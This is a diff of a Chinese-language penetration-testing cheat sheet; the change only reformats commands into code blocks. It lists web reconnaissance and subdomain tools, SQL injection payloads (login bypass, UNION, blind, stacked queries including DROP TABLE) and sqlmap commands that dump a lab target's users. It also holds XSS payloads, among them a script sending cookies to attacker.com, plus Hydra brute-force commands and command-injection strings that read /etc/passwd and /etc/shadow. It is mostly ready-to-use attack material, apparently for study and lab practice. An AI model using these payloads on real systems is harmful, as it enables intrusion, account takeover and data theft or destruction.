@@ -29,92 +29,185 @@ nikto -host http://target.com/ -> 自動找常見 Web 漏洞
 ```
 
 Web 資訊與路徑目錄強制爆破 -> 針對 Web 伺服器，收集網站架構、隱藏目錄、備份檔案及後台路徑。
-- whatweb http://target.com：辨識網站使用的 CMS（如 WordPress）、網頁伺服器（Nginx/Apache）及 JavaScript 框架。
-- dirb http://target.com：使用內建字典檔爆破網站的隱藏目錄與檔案。
-- gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt：使用 Go 語言開發的高速目錄爆破工具，指定特定字典檔進行搜尋。
-
+- 辨識網站使用的 CMS（如 WordPress）、網頁伺服器（Nginx/Apache）及 JavaScript 框架
+```
+whatweb http://target.com
+```
+- 使用內建字典檔爆破網站的隱藏目錄與檔案
+```
+dirb http://target.com
+```
+- 使用 Go 語言開發的高速目錄爆破工具，指定特定字典檔進行搜尋
+```
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+```
 DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
-- dnsrecon -d target.com -t axfr：嘗試進行 DNS 區域傳送（Zone Transfer）漏洞測試，若成功可直接獲取所有子網域。
-- amass enum -d target.com：使用 OWASP Amass 工具，整合多種被動與主動技術爆破子網域。
-- amass enum -passive -d target.com -o target_subdomains.txt -> 安全版
+- 嘗試進行 DNS 區域傳送（Zone Transfer）漏洞測試，若成功可直接獲取所有子網域
+```
+dnsrecon -d target.com -t axfr
+```
+- 使用 OWASP Amass 工具，整合多種被動與主動技術爆破子網域
+```
+amass enum -d target.com
+```
+- 安全版
+```
+amass enum -passive -d target.com -o target_subdomains.txt 
+```
 子網域清單（Subdomain List）您會抓到 target.com 底下所有活著（或曾經存在）的子網域，例如：vpn.target.com、stage.target.com、api-dev.target.com 等。
 情報來源標籤（Sources）因為加上了 -src，每一個找到的子網域前面都會標註它是怎麼被發現的。例如：[Brute Force] mfa.target.com（代表是靠暴力破解字典猜到的）、[Crtsh] mail.target.com（代表是從憑證日誌中撈到的）。這對評估資產的「隱蔽性」非常有幫助。
 網路拓撲架構（Network Topology）Amass 會自動解析這些子網域的 IP 位址、ASN（自治系統號）、以及所屬的網段（CIDR Block）。這能幫您理清目標企業是把服務託管在 AWS、GCP 還是自家機房。
 
 SQL injection
 1. 身份驗證繞過型 -> 利用布林（Boolean）邏輯，讓 WHERE 條件的判斷結果永遠為 TRUE。原本後端寫：SELECT * FROM users WHERE user = '$input' AND pass = '$pass'；注入後變成：SELECT * FROM users WHERE user = '' OR 1=1 -- ' AND pass = '$pass'(解析：資料庫讀到 --  後，後面的密碼檢查直接被廢棄，且 1=1 永遠成立，直接登入第一筆資料，通常是 Admin)
-- ' OR 1=1 --
-- ' OR 'a'='a
-- ' OR 1=1#
+```
+' OR 1=1 --
+```
+```
+' OR 'a'='a
+```
+```
+' OR 1=1#
+```
 2. 聯合查詢型（UNION-based）-> 在原本的查詢結果後面「疊加」攻擊者自己想查的表單資料。（前提：回傳的欄位數量與資料型態必須完全一致）
 (1) 步驟一：探測原語句有幾個欄位（測試到資料庫報錯為止）
-- ' ORDER BY 1 -- 
-- ' ORDER BY 2 --  ...（假設到 ORDER BY 4 報錯，代表有 3 個欄位）
+```
+' ORDER BY 1 -- 
+```
+假設到 ORDER BY 4 報錯，代表有 3 個欄位
+```
+' ORDER BY 2 --
+```
 (2) 步驟二：找出網頁會顯示哪個欄位的資料（顯錯點）
-- ' UNION SELECT null, null, null -- 
-- ' UNION SELECT 'a', 'b', 'c' -- 
+```
+' UNION SELECT null, null, null -- 
+```
+```
+' UNION SELECT 'a', 'b', 'c' -- 
+```
 (3) 步驟三：撈取敏感資料
-- ' UNION SELECT null, username, password FROM admin -- 
-- ' UNION SELECT null, @@version, null --  （偷看資料庫版本）
+```
+' UNION SELECT null, username, password FROM admin -- 
+```
+（偷看資料庫版本）
+```
+' UNION SELECT null, @@version, null --
+```
 3. 報錯注入型（Error-based）-> 當應用程式會直接把資料庫的 Error Message 印在網頁上時使用。故意寫錯語法，讓資料庫在「罵你的錯訊息」裡面順便把資料吐出來。
 經典語法（以 MySQL 的 extractvalue 函數為例）： (資料庫噴出的錯誤訊息會長這樣：XPATH syntax error: '~8.0.32-0ubuntu0.22.04.2' (版本號直接被塞在報錯文字裡露餡)
-- ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
+```
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
+```
 4. 盲註型（Blind SQLi） -> 當網頁完全不顯示查詢資料、也不顯示報錯訊息時（只會顯示「成功」或「失敗」頁面），資安人員會像玩終極密碼一樣，一個字一個字去「猜」。
 (1) 布林盲註（看頁面有沒有變，猜 True/False）： -> (如果頁面正常載入，代表密碼第一個字就是 a；如果跳到錯誤頁，就繼續試 b、c、d...)
-- ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+```
+' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+```
 (2) 間盲註（讓資料庫睡覺，看網頁載入時間長短）： -> (如果按下送出後，網頁「卡了 5 秒才跑完」，代表條件成立)
-- ' AND IF(1=1, SLEEP(5), 0) --
+```
+' AND IF(1=1, SLEEP(5), 0) --
+```
 5. 堆疊查詢型（Stacked Queries）-> 利用分號 ; 代表「上一句結束，接續執行下一句」，這是最致命的注入，可直接竄改資料庫。
 經典語法：
-- '; DROP TABLE users; -- 
-- '; UPDATE users SET role='admin' WHERE id=45; --
+```
+'; DROP TABLE users; -- 
+```
+```
+'; UPDATE users SET role='admin' WHERE id=45; --
+```
 (註：這極度依賴後端資料庫驅動程式「是否開啟了支援多指令批次執行」的功能)
 
 
 ## 漏洞利用
 1. sqlmap
-- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service --dbs --batch
-- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --tables --batch
-- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --T wp_users --dump --batch
-- curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"
-
+```
+sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service --dbs --batch
+```
+```
+sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --tables --batch
+```
+```
+sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --T wp_users --dump --batch
+```
+```
+curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"
+```
 2. XSS -> 使用 BurpSuite 攔截封包
 
 
 (1) 直接插入 <script> 標籤（最直接，但也最容易被防火牆擋下）
-- <script>alert(1)</script>
-- <script>alert(document.cookie)</script>
+```
+<script>alert(1)</script>
+```
+```
+<script>alert(document.cookie)</script>
+```
 
 (2) 利用 HTML 事件屬性（Event Handlers）（常搭配正常的標籤來隱蔽）
-- 當圖片載入失敗時觸發：<img src="x" onerror="alert(1)">
-- 當滑鼠移過去時觸發：<a href="#" onmouseover="alert(1)">
-- 當網頁載入時觸發：<body onload="alert(1)">
-
+- 當圖片載入失敗時觸發
+```
+<img src="x" onerror="alert(1)">
+```
+- 當滑鼠移過去時觸發
+```
+<a href="#" onmouseover="alert(1)">
+```
+- 當網頁載入時觸發
+```
+<body onload="alert(1)">
+```
 (3) 利用偽協議（Pseudo-protocols）（將 JS 偽裝成網址）
-- 放在超連結中：<a href="javascript:alert(1)">點擊這裡領取獎品</a>
+- 放在超連結中：
+```
+<a href="javascript:alert(1)">點擊這裡領取獎品</a>
+```
 ### 實戰中常見的注入語法與目的
 (1) 探測漏洞（Proof of Concept）-> 目的是證明「這段程式碼確實被瀏覽器執行了」，通常會使用彈出視窗
-- "><script>alert(document.cookie)</script> -> （前面的 "> 用用來閉合原有的 HTML 標籤）
-- <svg/onload=alert(1)> -> （利用 SVG 標籤與 onload 事件，語法極短，常用於繞過長度限制）
-- <ScRipT>alert(1)</sCripT> -> (利用大小寫混寫，繞過寫得很差的正則表達式過濾）
+（前面的 "> 用用來閉合原有的 HTML 標籤）
+```
+"><script>alert(document.cookie)</script>
+```
+（利用 SVG 標籤與 onload 事件，語法極短，常用於繞過長度限制）
+```
+<svg/onload=alert(1)>
+```
+(利用大小寫混寫，繞過寫得很差的正則表達式過濾）
+```
+<ScRipT>alert(1)</sCripT>
+```
 (2) 實際攻擊利用（Exploitation）-> 一旦確認有漏洞，攻擊者就會把 alert(1) 換成具備殺傷力的 Payload（惡意酬載）
 a. 竊取使用者的 Cookie（Session Hijacking）
-- <script>new Image().src="https://attacker.com/log?cookie=" + document.cookie;</script> -> (解析：在背景偷偷載入一張假圖片，順便把使用者的 Cookie 當作網址參數傳送給駭客的伺服器。)
+ -> (解析：在背景偷偷載入一張假圖片，順便把使用者的 Cookie 當作網址參數傳送給駭客的伺服器。)
+```
+<script>new Image().src="https://attacker.com/log?cookie=" + document.cookie;</script>
+```
 b. 網頁重新導向（釣魚網站）
-- <script>window.location.href="https://fake-login-page.com";</script>
+```
+<script>window.location.href="https://fake-login-page.com";</script>
+```
 c. 網頁塗鴉 / 釣魚表單
-- <script>document.body.innerHTML="<h1>請重新輸入密碼：</h1><input type='password'>"</script>
-
+```
+<script>document.body.innerHTML="<h1>請重新輸入密碼：</h1><input type='password'>"</script>
+```
 3. Hydra -> /usr/share/wordlists
 - SSH
+```
 hydra -l root -P passwords.txt 192.168.1.1 ssh
+```
 - FTP
+```
 hydra -L users.txt -P passwords.txt -t 4 192.168.1.50 ftp
+```
 - 網頁表單
+```
 hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"
+```
+```
 https://minmin0625.medium.com/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6lab-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hydra-nmap-%E5%9F%B7%E8%A1%8C%E9%81%A0%E7%AB%AF%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-a21d9b8149e0
+```
+```
 https://ithelp.ithome.com.tw/m/articles/10321942
-
+```
 4. Linux 提權
 - https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nopasswd
 - LinPEAS -> https://github.com/carlospolop/PEASS-ng
@@ -132,9 +225,15 @@ https://ithelp.ithome.com.tw/m/articles/10328790
 
 5. OS Command Injection (作業系統指令注入) -> 攻擊者通常會利用指令分隔符來串接惡意指令。假設原本的輸入框是讓使用者輸入 IP（如 127.0.0.1）。
 (1) 基本探測與讀取敏感檔 (Linux)
-- ; cat /etc/passwd (分號：執行完前面，繼續執行後面)
-- && cat /etc/shadow (AND：前面成功才執行後面)
-- | whoami (Pipe：把前面的輸出當作後面的輸入，通常會直接印出後面指令的結果)
+```
+; cat /etc/passwd (分號：執行完前面，繼續執行後面)
+```
+```
+&& cat /etc/shadow (AND：前面成功才執行後面)
+```
+```
+| whoami (Pipe：把前面的輸出當作後面的輸入，通常會直接印出後面指令的結果)
+```
 - `whoami` 或 $(whoami) (內嵌指令：優先執行括號內的指令)
 (2) 基本探測與讀取敏感檔 (Windows)
 - & type C:\Windows\win.ini
